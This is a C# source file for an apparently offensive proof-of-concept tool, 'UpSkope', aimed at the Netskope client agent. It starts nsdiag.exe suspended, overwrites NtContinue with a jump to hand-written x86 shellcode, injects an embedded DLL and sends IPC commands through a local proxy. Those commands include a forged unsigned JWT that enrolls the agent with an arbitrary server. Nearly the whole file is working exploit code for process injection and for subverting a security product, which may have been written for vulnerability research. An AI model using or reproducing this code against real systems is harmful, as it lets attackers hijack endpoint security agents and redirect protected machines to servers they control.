using System;
using System.Collections.Generic;
using Microsoft.IdentityModel.Tokens;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace UpSkope
{
    internal class Program
    {
        private const string NetskopeProc = @"C:\Program Files (x86)\Netskope\STAgent\nsdiag.exe";

        private const int ProxyPort = 8888;

        private static readonly Random random = new Random();

        static byte[] ReadResource(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            foreach (string name in assembly.GetManifestResourceNames())
            {
                if (name.EndsWith(resourceName))
                {
                    using (Stream stream = assembly.GetManifestResourceStream(name))
                    {
                        if (stream != null)
                        {
                            using (MemoryStream memoryStream = new MemoryStream())
                            {
                                stream.CopyTo(memoryStream);
                                return memoryStream.ToArray();
                            }
                        }
                    }
                }
            }
            return null;
        }

        public static string RandomString(int length)
        {
            const string alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string num = "0123456789";
            string chars = alpha + alpha.ToLower() + num;
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        static string CreateEnrollmentCommand(string server, bool encrypt = false)
        {
            var descriptor = new SecurityTokenDescriptor
            {
                Claims = new Dictionary<string, object>
                {
                    { "UserEmail", "test.user@example.com" },
                    { "OrgKey", RandomString(20) },
                    { "AddonUrl", server },
                    { "TenantId", "TestOrg" },
                    { "UTCEpoch", DateTime.UtcNow },
                },
                Issuer = "client",
                IssuedAt = DateTime.UtcNow,
                NotBefore = DateTime.UtcNow,
                Expires = DateTime.UtcNow.AddMinutes(120),
                SigningCredentials = null
            };

            var handler = new Microsoft.IdentityModel.JsonWebTokens.JsonWebTokenHandler
            {
                SetDefaultTimesOnTokenCreation = false
            };

            // Create the JWT token
            var tokenString = handler.CreateToken(descriptor);

            // Create the command
            var command = new IdpTokenCommand
            {
                TokenValue = tokenString,
                TenantName = "TestOrg",
                Encrypt = encrypt
            };
            return command.ToJson();
        }

        static async Task Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: UpSkope.exe <action> <options>");
                Console.WriteLine("Examples: \n\tUpSkope.exe ipc <commands_file.json>\n\tUpSkope.exe enroll <server>");
                return;
            }

            string action = args[0];
            string commandJson;
            bool encrypt = false;

            if (action == "ipc")
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: UpSkope.exe ipc <commands_file.json> <encrypt (optional): true/false>");
                    return;
                }

                string commandFile = args[1];

                if (args.Length == 3)
                {
                    encrypt = bool.Parse(args[2]);
                }

                if (!File.Exists(commandFile))
                {
                    Console.WriteLine($"Error: File not found: {commandFile}");
                    return;
                }

                // Encrypt if required
                var input = File.ReadAllText(commandFile);
                if (encrypt)
                {
                    var doc = JsonDocument.Parse(input);
                    var commandId = doc.RootElement.EnumerateObject().First().Name;
                    var rawValue = doc.RootElement.EnumerateObject().First().Value.GetRawText();
                    commandJson = Command.EncryptRawJson(commandId, rawValue);
                    Console.WriteLine("Encrypted: " +  commandJson);
                }
                else
                {
                    commandJson = input;
                }
            }
            else if (action == "enroll")
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: UpSkope.exe enroll <server> <encrypt (optional): true/false>");
                    return;
                }

                string server = args[1];

                if (args.Length == 3)
                {
                    encrypt = bool.Parse(args[2]);
                }

                // Validate hostname
                if (!Uri.CheckHostName(server).Equals(UriHostNameType.Dns))
                {
                    Console.WriteLine($"Error: Invalid server name: {server}");
                    return;
                }

                Console.WriteLine($"Enrolling in server: {server}");
                commandJson = CreateEnrollmentCommand(server, encrypt);
                Console.WriteLine("Command: " + commandJson);
            }
            else
            {
                Console.WriteLine($"Unknown action: {action}");
                return;
            }

            try
            {
                // Send IPC command via injection
                Console.WriteLine($"Launching {NetskopeProc}");
                var pInfo = ProcessLauncher.LaunchProcess(NetskopeProc, true);

                if (pInfo.hProcess == IntPtr.Zero || pInfo.dwProcessId == 0)
                    return;

                int targetPid = pInfo.dwProcessId;
                Console.WriteLine($"Process launched (PID: {targetPid})");

                // Get the DLL path
                string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "IPCProxy.dll");

                if (!File.Exists(dllPath))
                {
                    Console.WriteLine("Writing DLL");
                    File.WriteAllBytes(dllPath, ReadResource("IPCProxy.dll"));
                }

                // Inject the DLL
                Console.WriteLine($"Injecting into process {NetskopeProc} (PID: {targetPid})...");
                if (!InjectDll(pInfo.hProcess, pInfo.hThread, dllPath))
                {
                    Console.WriteLine("Failed to hijack entrypoint");
                    NativeMethods.CloseHandle(pInfo.hProcess);
                    NativeMethods.CloseHandle(pInfo.hThread);
                    return;
                }

                Console.WriteLine("Entrypoint hijacked successfully. Resuming thread");
                NativeMethods.ResumeThread(pInfo.hThread);

                // Wait for the TCP proxy to start
                Console.WriteLine("Waiting for TCP proxy to start...");
                await Task.Delay(3000);

                // Connect to TCP proxy and send command
                using (var client = new ComClient())
                {
                    // Set the port for our IPC proxy
                    client.SetPort(ProxyPort);

                    Console.WriteLine("Connecting to TCP proxy...");
                    await client.ConnectAsync();
                    Console.WriteLine("Connected to TCP proxy");

                    // Initialize the connection
                    await client.InitializeConnectionAsync();
                    Console.WriteLine("Connection initialized");

                    // Send the command
                    Console.WriteLine($"\nSending command: {commandJson}");
                    await client.SendCommandAsync(commandJson);

                    // Receive the response
                    string response = await client.ReceiveResponseAsync();
                    Console.WriteLine($"Received response: {response}");

                    // Done
                    Console.WriteLine("Press any key to terminate the process...");
                    Console.ReadKey();

                    // Cleanup
                    NativeMethods.CloseHandle(pInfo.hProcess);
                    NativeMethods.CloseHandle(pInfo.hThread);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static bool InjectDll(IntPtr hProc, IntPtr hThread, string dllPath)
        {
            try
            {
                if (hProc == IntPtr.Zero)
                {
                    throw new Exception($"Failed to open process. Error: {Marshal.GetLastWin32Error()}");
                }

                // Get LoadLibraryA address
                IntPtr loadLibraryAddr = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (loadLibraryAddr == IntPtr.Zero)
                {
                    throw new Exception("Failed to get LoadLibraryA address");
                }

                // Allocate memory in target process for DLL path
                byte[] dllPathBytes = System.Text.Encoding.ASCII.GetBytes(dllPath + '\0');
                IntPtr dllPathAddr = NativeMethods.VirtualAllocEx(
                    hProc,
                    IntPtr.Zero,
                    (uint)dllPathBytes.Length,
                    NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE,
                    NativeMethods.PAGE_READWRITE);

                if (dllPathAddr == IntPtr.Zero)
                {
                    throw new Exception($"Failed to allocate memory for DLL path. Error: {Marshal.GetLastWin32Error()}");
                }

                Console.WriteLine("Allocated memory in remote proc: {0:X}", dllPathAddr);

                // Write DLL path to target process memory
                if (!NativeMethods.WriteProcessMemory(hProc, dllPathAddr, dllPathBytes, (uint)dllPathBytes.Length, out UIntPtr bytesWritten))
                {
                    throw new Exception($"Failed to write DLL path to process memory. Error: {Marshal.GetLastWin32Error()}");
                }

                byte[] shellcode = new byte[]
                {
                    0x60,                           // pushad (save all registers)
                    0x9C,                           // pushfd (save flags)
                    0xB9, 0x00, 0x00, 0x00, 0x00,   // mov ecx, NtContinue address
                    0xBA, 0x00, 0x00, 0x00, 0x00,   // mov edx, original bytes address
                    0x8A, 0x02,                     // mov al, [edx]
                    0x88, 0x01,                     // mov [ecx], al
                    0x8A, 0x42, 0x01,               // mov al, [edx+1]
                    0x88, 0x41, 0x01,               // mov [ecx+1], al
                    0x8A, 0x42, 0x02,               // mov al, [edx+2]
                    0x88, 0x41, 0x02,               // mov [ecx+2], al
                    0x8A, 0x42, 0x03,               // mov al, [edx+3]
                    0x88, 0x41, 0x03,               // mov [ecx+3], al
                    0x8A, 0x42, 0x04,               // mov al, [edx+4]
                    0x88, 0x41, 0x04,               // mov [ecx+4], al
                    0x68, 0x00, 0x00, 0x00, 0x00,   // push DLL path address
                    0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, LoadLibraryA address
                    0xFF, 0xD0,                     // call eax (LoadLibraryA)
                    0x9D,                           // popfd (restore flags)
                    0x61,                           // popad (restore all registers)
                    0xEB, 0xFE                      // jmp $ (infinite loop)
                };

                // Allocate memory for shellcode
                IntPtr shellcodeAddr = NativeMethods.VirtualAllocEx(
                    hProc,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE,
                    NativeMethods.PAGE_EXECUTE_READWRITE);

                if (shellcodeAddr == IntPtr.Zero)
                {
                    throw new Exception($"Failed to allocate memory for shellcode. Error: {Marshal.GetLastWin32Error()}");
                }

                // Get NtContinue address
                IntPtr targetFuncAddr = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("ntdll.dll"), "NtContinue");
                if (targetFuncAddr == IntPtr.Zero)
                {
                    throw new Exception("Failed to get NtContinue address");
                }
                Console.WriteLine($"NtContinue address: 0x{targetFuncAddr:X}");

                // Copy NtContinue original bytes
                byte[] originalBytes = new byte[5];
                Marshal.Copy(targetFuncAddr, originalBytes, 0, 5);

                // Allocate memory for original bytes
                IntPtr originalBytesAddr = NativeMethods.VirtualAllocEx(
                    hProc,
                    IntPtr.Zero,
                    5,
                    NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE,
                    NativeMethods.PAGE_READWRITE);

                if (originalBytesAddr == IntPtr.Zero)
                {
                    throw new Exception($"Failed to allocate memory for original bytes. Error: {Marshal.GetLastWin32Error()}");
                }

                // Write original bytes to target process
                if (!NativeMethods.WriteProcessMemory(hProc, originalBytesAddr, originalBytes, 5, out bytesWritten))
                {
                    throw new Exception($"Failed to write original bytes. Error: {Marshal.GetLastWin32Error()}");
                }

                // Patch shellcode with addresses
                BitConverter.GetBytes((int)targetFuncAddr).CopyTo(shellcode, 3);    // NtContinue address
                BitConverter.GetBytes((int)originalBytesAddr).CopyTo(shellcode, 8); // Original bytes address
                BitConverter.GetBytes((int)dllPathAddr).CopyTo(shellcode, 41);      // DLL path address
                BitConverter.GetBytes((int)loadLibraryAddr).CopyTo(shellcode, 46);  // LoadLibraryA address

                // Calculate jump back offset (jump to NtContinue + 5)
                int jumpBackOffset = (int)(targetFuncAddr) - (int)shellcodeAddr - shellcode.Length;

                // Write shellcode
                if (!NativeMethods.WriteProcessMemory(hProc, shellcodeAddr, shellcode, (uint)shellcode.Length, out bytesWritten))
                {
                    throw new Exception($"Failed to write shellcode. Error: {Marshal.GetLastWin32Error()}");
                }

                // Make NtContinue writable
                if (!NativeMethods.VirtualProtectEx(hProc, targetFuncAddr, new UIntPtr(5), NativeMethods.PAGE_EXECUTE_READWRITE, out uint oldProtect))
                {
                    throw new Exception($"Failed to make NtContinue writable. Error: {Marshal.GetLastWin32Error()}");
                }

                // Overwrite NtContinue with jmp to our shellcode
                byte[] jmpCode = new byte[] { 0xE9, 0x00, 0x00, 0x00, 0x00 };
                BitConverter.GetBytes((int)shellcodeAddr - (int)targetFuncAddr - 5).CopyTo(jmpCode, 1);

                Console.WriteLine($"Attempting to overwrite NtContinue at: 0x{targetFuncAddr:X}");
                Console.WriteLine($"Shellcode address: 0x{shellcodeAddr:X}");
                Console.WriteLine($"Jump offset: 0x{(int)shellcodeAddr - (int)targetFuncAddr:X}");

                if (!NativeMethods.WriteProcessMemory(hProc, targetFuncAddr, jmpCode, (uint)jmpCode.Length, out bytesWritten))
                {
                    throw new Exception($"Failed to overwrite NtContinue. Error: {Marshal.GetLastWin32Error()}");
                }

                Console.WriteLine("Success");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error injecting DLL: {ex.Message}");
                return false;
            }
        }
    }
}